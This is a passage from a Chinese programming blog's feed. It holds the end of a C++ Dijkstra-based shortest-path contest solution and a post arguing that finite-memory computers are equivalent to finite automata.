class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; adj;</span><br><span class="line">&#125;;</span><br><span class="line">Node v[<span class="number">600</span>];</span><br><span class="line"><span class="keyword">int</span> length[<span class="number">600</span>][<span class="number">600</span>]; <span class="comment">// length[i][j]记录从node i到node j的length</span></span><br><span class="line"><span class="keyword">int</span> TIME[<span class="number">600</span>][<span class="number">600</span>]; <span class="comment">// TIME[i][j]记录从node i到node j的用时</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tp[<span class="number">600</span>];<span class="comment">// node's parent list</span></span><br><span class="line"><span class="keyword">int</span> tpResult[<span class="number">600</span>];<span class="comment">// 最终的node的parent</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> BEGIN, END; <span class="comment">// 题目输入的天梯队员的起点和要到达的终点</span></span><br><span class="line"><span class="keyword">int</span> vertexCnt, edgeCnt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dijstra</span><span class="params">(<span class="keyword">int</span> weight[][<span class="number">600</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DFS</span><span class="params">(<span class="keyword">bool</span> isLength)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outp</span><span class="params">(<span class="keyword">int</span> f, <span class="keyword">int</span> index)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                TIME[i][j] = INF;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                length[i][j] = INF;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            v[i].index = i;</span><br><span class="line">            v[i].adj.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            tp[i].clear();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        vertexCnt = n, edgeCnt = m;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, one, l, t;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d%d%d"</span>, &amp;v1, &amp;v2, &amp;one, &amp;l, &amp;t);</span><br><span class="line">            v[v1].adj.push_back(v2);</span><br><span class="line">            <span class="comment">// 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可</span></span><br><span class="line">            length[v1][v2] = length[v1][v2] &lt; l ? length[v1][v2] : l;</span><br><span class="line">            TIME[v1][v2] = TIME[v1][v2] &lt; t ? TIME[v1][v2] : t;</span><br><span class="line">            <span class="keyword">if</span> (!one) &#123;</span><br><span class="line">                v[v2].adj.push_back(v1);</span><br><span class="line">                length[v2][v1] = length[v2][v1] &lt; l ? length[v2][v1] : l;</span><br><span class="line">                TIME[v2][v1] = TIME[v2][v1] &lt; t ? TIME[v2][v1] : t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;BEGIN, &amp;END);</span><br><span class="line">        <span class="keyword">if</span> (BEGIN == END) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Time = "</span></span><br><span class="line">                 &lt;&lt; <span class="string">"0"</span></span><br><span class="line">                 &lt;&lt; <span class="string">"; Distance = "</span></span><br><span class="line">                 &lt;&lt; <span class="string">"0"</span></span><br><span class="line">                 &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class="string">" =&gt; "</span> &lt;&lt; END &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Time = "</span> &lt;&lt; TIME[BEGIN][END] &lt;&lt; <span class="string">"; Distance = "</span> &lt;&lt; length[BEGIN][END] &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class="string">" =&gt; "</span> &lt;&lt; END &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> timeEND = dijstra(TIME);</span><br><span class="line"><span class="comment">//        outp(END, 0);</span></span><br><span class="line">        DFS(<span class="literal">false</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; r1, r2;</span><br><span class="line">        r1.push_back(END);</span><br><span class="line">        <span class="comment">// 以下这种构造路径的方式是建立在起点不同于终点的情况下</span></span><br><span class="line">        <span class="keyword">int</span> tmp_tp = tpResult[END];</span><br><span class="line">        r1.push_back(tmp_tp);</span><br><span class="line">        <span class="keyword">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class="line">            tmp_tp = tpResult[tmp_tp];</span><br><span class="line">            r1.push_back(tmp_tp);</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(r1.begin(), r1.end());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            tp[i].clear();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lenEND = dijstra(length);</span><br><span class="line"><span class="comment">//        outp(END, 0);</span></span><br><span class="line">        DFS(<span class="literal">true</span>);</span><br><span class="line">        r2.push_back(END);</span><br><span class="line">        tmp_tp = tpResult[END];</span><br><span class="line">        r2.push_back(tmp_tp);</span><br><span class="line">        <span class="keyword">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class="line">            tmp_tp = tpResult[tmp_tp];</span><br><span class="line">            r2.push_back(tmp_tp);</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(r2.begin(), r2.end());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">bool</span> isSame = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (r1.size() == r2.size()) &#123;</span><br><span class="line">            isSame = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r1.size(); i++) &#123;</span><br><span class="line">                isSame = (r1[i] == r2[i]) &amp;&amp; isSame;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isSame) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Time = "</span> &lt;&lt; timeEND &lt;&lt; <span class="string">"; Distance = "</span> &lt;&lt; lenEND &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r1.size() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class="string">" =&gt; "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; r1[r1.size() - <span class="number">1</span>] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Time = "</span> &lt;&lt; timeEND &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r1.size() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class="string">" =&gt; "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; r1[r1.size() - <span class="number">1</span>] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Distance = "</span> &lt;&lt; lenEND &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r2.size() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; r2[i] &lt;&lt; <span class="string">" =&gt; "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; r2[r2.size() - <span class="number">1</span>] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> me;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    Edge_t(<span class="keyword">int</span> m, <span class="keyword">int</span> h, <span class="keyword">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> Edge_t &amp;x) <span class="keyword">const</span> &#123; <span class="keyword">return</span> x.t &lt; <span class="keyword">this</span>-&gt;t; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bfs+优先队列其实就是dijstra算法</span></span><br><span class="line"><span class="comment">// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到</span></span><br><span class="line"><span class="comment">// 所以result set只会有node被加进去而不会有node被踢出去</span></span><br><span class="line"><span class="comment">// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dijstra</span><span class="params">(<span class="keyword">int</span> weight[][<span class="number">600</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> resWei[<span class="number">600</span>];</span><br><span class="line">    priority_queue&lt;Edge_t&gt; que;</span><br><span class="line">    que.push(Edge_t(BEGIN, <span class="number">0</span>, <span class="number">0</span>));<span class="comment">// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0</span></span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> visit[vertexCnt];  <span class="comment">// 记录某点是否已经加入到dijstra的result set里</span></span><br><span class="line">    <span class="built_in">memset</span>(visit, <span class="number">0</span>, <span class="keyword">sizeof</span>(visit) * <span class="keyword">sizeof</span>(<span class="keyword">bool</span>));</span><br><span class="line">    <span class="keyword">while</span> (!que.empty()) &#123;</span><br><span class="line">        Edge_t t = que.top();</span><br><span class="line">        que.pop();</span><br><span class="line">        <span class="comment">// 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里</span></span><br><span class="line">        <span class="keyword">if</span> (visit[t.me]) &#123;</span><br><span class="line">            assert(resWei[t.me] &lt;= t.t);</span><br><span class="line">            <span class="keyword">if</span> (resWei[t.me] == t.t) &#123;</span><br><span class="line">                tp[t.me].push_back(t.p);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visit[t.me] = <span class="literal">true</span>;</span><br><span class="line">        tp[t.me].push_back(t.p);</span><br><span class="line">        resWei[t.me] = t.t;</span><br><span class="line">        <span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;adj = v[t.me].adj;</span><br><span class="line">        <span class="keyword">int</span> al = adj.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; al; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adj[i] == t.me)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resWei[END];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">600</span>];</span><br><span class="line"><span class="keyword">bool</span> dpVisit[<span class="number">600</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __dfs(<span class="keyword">int</span> f, <span class="keyword">bool</span> isLength);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DFS</span><span class="params">(<span class="keyword">bool</span> isLength)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0xff</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    <span class="built_in">memset</span>(tpResult, <span class="number">0</span>, <span class="keyword">sizeof</span>(tpResult));</span><br><span class="line">    <span class="built_in">memset</span>(dpVisit, <span class="number">0</span>, <span class="keyword">sizeof</span>(dpVisit));</span><br><span class="line">    <span class="keyword">return</span> __dfs(END, isLength);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __dfs(<span class="keyword">int</span> f, <span class="keyword">bool</span> isLength) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dp[f] &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> dp[f];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (f == BEGIN) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;t = tp[f];</span><br><span class="line">    <span class="keyword">int</span> result = INF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[i]==f)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (dpVisit[t[i]])  <span class="comment">// 代表该节点在这条路径上已经被访问过</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        dpVisit[f] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> p = __dfs(t[i], isLength) + (isLength ? <span class="number">1</span> : length[t[i]][f]);</span><br><span class="line">        dpVisit[f] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (p &lt; result) &#123;</span><br><span class="line">            tpResult[f] = t[i];</span><br><span class="line">            result = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[f] = result;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> path[<span class="number">600</span>];</span><br><span class="line"><span class="keyword">bool</span> outpVisit[<span class="number">600</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outp</span><span class="params">(<span class="keyword">int</span> f, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    outpVisit[f] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (f == BEGIN) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"outp: "</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; path[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        outpVisit[f] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[index] = f;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;t = tp[f];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (outpVisit[t[i]])<span class="comment">// means that 前辈们已经访问过了，再访问就成环了</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        outp(t[i], index + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    outpVisit[f] = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Dijstra最短路变形
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="Dijstra最短路" scheme="https://h-zex.github.io/tags/Dijstra%E6%9C%80%E7%9F%AD%E8%B7%AF/"/>
    
      <category term="天梯赛" scheme="https://h-zex.github.io/tags/%E5%A4%A9%E6%A2%AF%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>有限存储的计算机等价于有限自动机（DFA、NFA）</title>
    <link href="https://h-zex.github.io/2018/05/11/%E6%9C%89%E9%99%90%E5%AD%98%E5%82%A8%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AD%89%E4%BB%B7%E4%BA%8E%E6%9C%89%E9%99%90%E8%87%AA%E5%8A%A8%E6%9C%BA%EF%BC%88DFA%E3%80%81NFA%EF%BC%89/"/>
    <id>https://h-zex.github.io/2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/</id>
    <published>2018-05-11T08:13:18.000Z</published>
    <updated>2018-08-04T04:48:35.571Z</updated>
    
    <content type="html"><![CDATA[<h3 id="B-0-n1-n-n-ge0"><a href="#B-0-n1-n-n-ge0" class="headerlink" title="$B=\{0^n1^n|n\ge0\}$"></a>$B=\{0^n1^n|n\ge0\}$</h3><ul><li>Michael Sipser 的 <em>Introduction to the Theory of Computation</em> 的1.4提到一个非正则语言的例子，$B=\{0^n1^n|n\ge0\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别</li><li>但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢</li><li>事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\{0^n1^m|n\ mod\ max=m\ mod\ max\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值</li><li>如果是n处于一定范围内，容易构造出一台DFA识别B：<ul><li>设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量</li><li>那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集</li><li>转移方程为<ul><li>首先： $&lt;0,0&gt;\rightarrow&lt;1,0&gt;\rightarrow&lt;2,0&gt;\rightarrow…\rightarrow&lt;1000,0&gt;$</li><li>然后：从任意$&lt;n,0&gt;$ 都可以转移到 $&lt;n,1&gt;$</li><li>然后：一旦转移到 $&lt;n,1&gt;$ ，就不能转移到 $&lt;n+k,m&gt;, (k&gt;0)$ ，也就是不能增长n的值</li><li>最后：一旦转移到 $&lt;n, n&gt;$ 就accept</li></ul></li></ul></li></ul><h3 id="为什么现实中的计算机有可能是DFA"><a href="#为什么现实中的计算机有可能是DFA" class="headerlink" title="为什么现实中的计算机有可能是DFA"></a>为什么现实中的计算机有可能是DFA</h3><ul><li>计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能</li></ul><h3 id="对任意一段代码构造等价的NFA"><a href="#对任意一段代码构造等价的NFA" class="headerlink" title="对任意一段代码构造等价的NFA"></a>对任意一段代码构造等价的NFA</h3><h5 id="NFA构造方法描述"><a href="#NFA构造方法描述" class="headerlink" title="NFA构造方法描述"></a>NFA构造方法描述</h5><ul><li>假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$&lt;c1,c2,c3,c4,c5&gt;$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个）</li></ul><ul><li>输入字符表是$\{0,1\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。</li></ul><ul><li>假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$&lt;0,0,0,0,0&gt;$ 就是起始态</li><li>假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$&lt;1,2,3,4,5&gt;$ 就是该NFA的accept state</li><li>该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$&lt;d1,d2,d3,d4,d5&gt;$ ，输入后处于 $&lt;d6,d7,d8,d9,d10&gt;$ ，则在从$&lt;d1,d2,d3,d4,d5&gt;$ 到 $&lt;d6,d7,d8,d9,d10&gt;$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\varepsilon$ </li></ul><h5 id="为什么该NFA只接受允许的字符串，而不会接受多余的字符串"><a href="#为什么该NFA只接受允许的字符串，而不会接受多余的字符串" class="headerlink" title="为什么该NFA只接受允许的字符串，而不会接受多余的字符串"></a>为什么该NFA只接受允许的字符串，而不会接受多余的字符串</h5><ul><li>首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串</li><li>设置一个新的起始态，该起始态有$\varepsilon$ 到所有为每个字符串构造的NFA</li><li>则最终的NFA只接受允许的字符串</li></ul><h5 id="是否会出现情况：代码两次处于某状态但是行为不一样"><a href="#是否会出现情况：代码两次处于某状态但是行为不一样" class="headerlink" title="是否会出现情况：代码两次处于某状态但是行为不一样"></a>是否会出现情况：代码两次处于某状态但是行为不一样</h5><ul><li>答案是肯定不会</li><li>计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的</li></ul><h3 id="对任意一台计算机构造等价的DFA"><a href="#对任意一台计算机构造等价的DFA" class="headerlink" title="对任意一台计算机构造等价的DFA"></a>对任意一台计算机构造等价的DFA</h3><ul><li>对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算</li><li>先说明一些前置情况：<ul><li>现实中计算机使用源码处理特定的输入</li><li>把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M</li></ul></li><li>因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA</li><li>然后开始构造DFA<ul><li>该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个</li><li>DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态</li><li>第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态</li></ul></li><li>从而该DFA接受$\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合</li></ul><h3 id="计算机可以死循环，DFA不会死循环，为什么"><a href="#计算机可以死循环，DFA不会死循环，为什么" class="headerlink" title="计算机可以死循环，DFA不会死循环，为什么"></a>计算机可以死循环，DFA不会死循环，为什么</h3><ul><li>consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。</li></ul><ul><li><p>因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。</p></li><li><p>在NFA，这种情况死循环的状况也会发生——一组状态以$\varepsilon$ 连接在一起形成环，从而导致无限读入$\varepsilon$ ，无限循环</p></li><li><p>截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变</p></li><li><p>而按照<em>Introduction to the Theory of Computation</em> 的1.2节的<em>EQUIVALENCE OF NFAS AND DFAS</em>DFA 描述的方法，其正是去掉了这种$\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）：</p><img src="/2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/1.png"><p>$E(R)$ 是一个集合，集合中元素不重复，而$\varepsilon$ 环所到达的状态必然是重复的，所以就把$\varepsilon$ 环断开了</p></li></ul>]]></content>
    
    <summary type="html">
    
      区别于图灵机的无限纸带，现实的计算机只有有限存储，所以其不是TM，而是DFA/NFA
    
    </summary>
    
      <category term="计算理论" scheme="https://h-zex.github.io/categories/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/"/>
    
    
      <category term="DFA" scheme="https://h-zex.github.io/tags/DFA/"/>
    
      <category term="NFA" scheme="https://h-zex.github.io/tags/NFA/"/>
    
      <category term="有限自动机" scheme="https://h-zex.github.io/tags/%E6%9C%89%E9%99%90%E8%87%AA%E5%8A%A8%E6%9C%BA/"/>
    
      <category term="计算理论" scheme="https://h-zex.github.io/tags/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>n元逆序对数量求解</title>
    <link href="https://h-zex.github.io/2018/03/20/n%E5%85%83%E9%80%86%E5%BA%8F%E5%AF%B9%E6%95%B0%E9%87%8F%E6%B1%82%E8%A7%A3/"/>
    <id>https://h-zex.github.io/2018/03/20/n元逆序对数量求解/</id>
    <published>2018-03-19T16:05:01.000Z</published>
    <updated>2018-08-04T04:48:35.589Z</updated>
    
